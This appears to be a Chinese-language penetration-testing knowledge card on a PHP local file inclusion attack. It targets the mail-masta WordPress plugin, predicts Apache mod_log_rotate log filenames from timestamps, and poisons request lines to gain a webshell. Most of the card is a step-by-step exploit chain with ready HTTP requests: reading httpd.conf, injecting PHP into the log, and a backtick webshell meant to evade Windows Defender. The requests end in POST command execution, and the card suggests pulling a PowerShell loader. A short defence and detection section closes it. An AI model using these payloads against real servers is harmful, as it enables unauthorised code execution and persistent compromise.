---
id: web-php-file-inclusion-apache-mod-log-rotate-timestamp-log-poisoning
title: Apache mod_log_rotate 轮转日志文件名预测 + LFI 日志包含：access.log.<当日08:00时间戳> 请求行投毒 getshell
type: scenario
domain: web
path: web/php/file-inclusion
technique: lfi-rotated-access-log-timestamp-poisoning
aliases:
- mod_log_rotate 日志包含
- access.log 时间戳 包含
- 日志轮转 日志投毒
- RotateLogsLocalTime
- 轮转日志 getshell
- 请求行投毒 绕过 URL 编码
tags:
- web
- php
- lfi
- file-inclusion
- log-poisoning
- apache
- mod-log-rotate
- webshell
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V282
  verified_at: '2026-11-08T05:22:21+08:00'
  notes: 已对照原文与截图核对：Apache 头 mod_log_rotate/1.02、httpd.conf 中 RotateLogs On/RotateLogsLocalTime On、access.log.<epoch>、Burp Raw 请求行投毒、反引号一句话绕过 Defender 均一致；注意原文正文示例 2024-08-08 08:00 +0800=1723075200，而截图实际请求使用 access.log.1722816000（2024-08-05 08:00 +0800），卡按正文示例记录并提示按当日 08:00 计算。dedup 与 access-log-poisoning-webshell 为 related，轮转文件名触发条件不同，append 理由成立。
---

## 一句话结论

当目标开启了 Apache `mod_log_rotate`（`RotateLogs On`）时，常规 `access.log` 会是空的，实时日志被写成 `access.log.<时间戳>`（原文环境为当日 08:00 的 Unix 时间戳，即 00:00 UTC）；先用 LFI 读 `httpd.conf` 确认轮转配置并算出文件名，再用 Burp 原样发送 `GET /<?php ...?>` 把 PHP 代码写进请求行（避免浏览器 URL 编码），最后 LFI 包含该轮转日志即可执行代码，拿到 WebShell。

## 原理

- Apache 的 `mod_log_rotate` 会按周期把访问日志重命名归档；配置 `RotateLogsLocalTime On` 表示按本地时间计算归档时间戳。原文环境的日志文件名形如 `access.log.1723075200`，该时间戳对应 `2024-08-08 08:00:00 +0800`（即 `2024-08-08 00:00:00 UTC`），说明轮转发生在每日 08:00 本地时间；因此「当日 08:00 的 epoch」就是当天日志的文件名。
- 访问日志会原样记录请求行：`GET /<payload> HTTP/1.1` 中的 `<payload>` 会进入日志。PHP 的 `include` 会把日志文件当模板解析，`<?php ... ?>` 片段即被执行。
- 为什么必须用 Burp 原始请求：浏览器/HackBar 会把 URL 中的 `<`、`?`、`>` 百分号编码成 `%3C%3F...`，日志里记录的是编码后的字符串，`include` 后只是输出文本，不会形成 PHP 标签；在 Burp 的 Raw 模式直接写请求行则不经过 URL 编码，日志里保留 `<?php`。
- 为什么能定位到轮转文件：先用 LFI 的 `php://filter/read=convert.base64-encode` 读 `httpd.conf`，看到 `<IfModule log_rotate_module> RotateLogs On / RotateLogsLocalTime On </IfModule>`，再按当前日期算出 `access.log.<epoch>`；原文还通过 phpinfo 拿到 Web 根 `C:/phpstudy_pro/WWW`，从而确定从插件目录到 `Extensions/Apache2.4.39/logs/` 的穿越层数。
- 代码执行被 Defender 拦时：`@eval($_POST[...])` 类一句话会被查杀；原文改用反引号执行算符 `<?php`$_POST[1]`?>`，POST `1=whoami` 即可执行系统命令并回显，绕过对 `eval` 的特征匹配。

## 触发条件

- 存在可控的 PHP 文件包含（本例为 mail-masta 的 `count_of_send.php?pl=`），可穿越到 Apache 日志目录。
- Apache 启用 `mod_log_rotate`，`access.log` 因轮转而为空或不可用；日志文件名带时间戳且可预测。
- Web 进程对日志文件有读权限，`open_basedir` 未阻断。
- 攻击者知道 Apache 安装路径（phpinfo、报错、配置文件泄露或默认路径）。
- 目标未对请求行中的 `<?php` 做拦截/转义（或可用大小写/注释变形绕过）。

## 利用步骤

1. 通过 LFI 读 `httpd.conf` 并 base64 解码，确认 `RotateLogs On` 与 `RotateLogsLocalTime On`，同时拿到日志目录（原文 `Extensions/Apache2.4.39/logs/`）。
2. 计算当日 08:00（本地时区）的 Unix 时间戳，得到文件名 `access.log.<epoch>`；例如 `2024-08-08 08:00:00 +0800` → `1723075200`。
3. 先用 LFI 访问 `../../../../../../Extensions/Apache2.4.39/logs/access.log.<epoch>`，确认文件存在且可读（原文截图可直接看到日志内容）。
4. 用 Burp Repeater 的 Raw 模式发送投毒请求：`GET /<?php phpinfo();?> HTTP/1.1`（不经过 URL 编码），日志会记录该原始请求行。
5. 再次 LFI 包含同一日志文件，确认 `phpinfo()` 执行；如果 `<?php` 被过滤，尝试 `<?=`、大小写或注释变形。
6. 若 Defender 拦截 `@eval`，投毒改为 `GET /<?php`$_POST[1]`?> HTTP/1.1`，然后向包含 URL POST `1=whoami` 验证命令执行。
7. 通过该命令执行入口下载/执行后续载荷（如 PowerShell 下载 loader），或直接写独立 WebShell 固化访问。

## PoC

读配置（base64）：

```http
GET /wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/read=convert.base64-encode/resource=../../../../../../Extensions/Apache2.4.39/conf/httpd.conf HTTP/1.1
Host: target
```

配置关键片段：

```apache
<IfModule log_rotate_module>
    RotateLogs On
    RotateLogsLocalTime On
</IfModule>
```

计算时间戳（Linux/macOS 本地时区）：

```bash
date -d 'today 08:00' +%s
# 原文示例：2024-08-08 08:00:00 +0800 -> 1723075200
```

投毒请求（Burp Raw，勿 URL 编码）：

```http
GET /<?php phpinfo();?> HTTP/1.1
Host: target
```

Defender 拦截 eval 时的替代投毒：

```http
GET /<?php`$_POST[1]`?> HTTP/1.1
Host: target
```

包含轮转日志并执行命令：

```http
GET /wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=../../../../../../Extensions/Apache2.4.39/logs/access.log.1723075200 HTTP/1.1
Host: target
```

```http
POST /wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=../../../../../../Extensions/Apache2.4.39/logs/access.log.1723075200 HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

1=whoami
```

## 变体与关联

- 变体：轮转周期可能不是每日 08:00；按 `RotateLogsLocalTime` 的时区与服务器配置枚举 `access.log.<epoch>`（向前/向后各试几个整点），或用目录泄露/报错确定。
- 变体：日志格式若记录 `User-Agent`/`Referer`，可把 payload 放在这些头里，避免请求行被规范化；但请求行投毒对 URL 编码更敏感，Burp Raw 是原文验证过的方式。
- 变体：`phpinfo` 被禁用时用 `<?php echo 1;?>` 或写文件函数验证；命令执行被 `disable_functions` 限制时改走文件写入/包含。
- 变体：Defender 规则除 `eval` 外还会匹配 `system`/`assert`；反引号执行算符、`preg_replace`/`call_user_func` 等替代需按目标 PHP 版本测试。
- 关联：[[web-php-file-inclusion-access-log-poisoning-webshell]]（标准 `access.log` 的日志包含；本卡是「日志轮转后文件名未知」场景）。
- 关联：[[web-php-file-inclusion-mail-masta-cve-2016-10956-lfi]]（本例使用的 LFI 入口）。
- 关联：[[web-php-file-inclusion-php-error-log-poisoning-webshell]]（错误日志投毒的同类思路）。

## 检测与防御

- 修复：消除文件包含（白名单固定文件），从根本上阻断日志包含；升级/移除 mail-masta 等存在 `include($_GET[...])` 的插件。
- 加固：`open_basedir` 限制 Web 进程只能访问 Web 根；日志目录仅日志服务可读；关闭 `allow_url_include`。
- 加固：日志中对请求行/头的 `<`、`>`、`?` 做转义（或使用不记录原始请求行的格式），使 `<?php` 无法在日志中成形；对 `mod_log_rotate` 设置不可预测的归档命名/目录权限。
- 检测：访问日志/POST body 中出现 `<?php`、`<?=`、反引号、`phpinfo(`、`eval(`、`$_POST[` 等片段；LFI 参数指向 `logs/access.log`、`access.log.<数字>`、`error.log`。
- 检测：Web 进程读取 Apache 配置与日志目录、随后出现命令执行回显的序列；对 `mod_log_rotate` 产生的日志文件被 Web 请求包含做专门规则。
